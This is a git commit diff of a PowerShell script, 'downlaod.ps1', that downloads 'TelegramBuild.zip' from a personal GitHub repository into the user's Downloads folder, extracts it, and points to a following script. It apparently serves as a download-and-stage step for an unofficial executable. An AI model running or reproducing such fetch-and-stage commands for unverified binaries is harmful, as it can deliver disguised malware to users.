7cf7ea35ba419037df20456c953c0c37dfb5138f
waed69 <waedpsn2@gmail.com>
2025-04-26 16:39:17 +0200

    Update downlaod.ps1

--- downlaod.ps1
+++ downlaod.ps1
@@ -1,7 +1,15 @@
-$Source = "https://github.com/waed69/n/raw/main/TelegramBuild.exe"  
-$Destination = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe"
+# --- Variables ---
+$Source = "https://github.com/waed69/n/raw/refs/heads/main/TelegramBuild.zip"  # <-- Link to your ZIP file
+$DownloadPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild.zip"
+$ExtractPath = "C:\Users\$env:USERNAME\Downloads\TelegramBuild"  # Folder to unzip into
 
-Invoke-WebRequest -Uri $Source -OutFile $Destination
+# --- Download the ZIP file ---
+Invoke-WebRequest -Uri $Source -OutFile $DownloadPath
+Start-Sleep -Seconds 2
+
+# --- Extract the ZIP file ---
+Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
+Start-Sleep -Seconds 2
 
 
 #run the next script
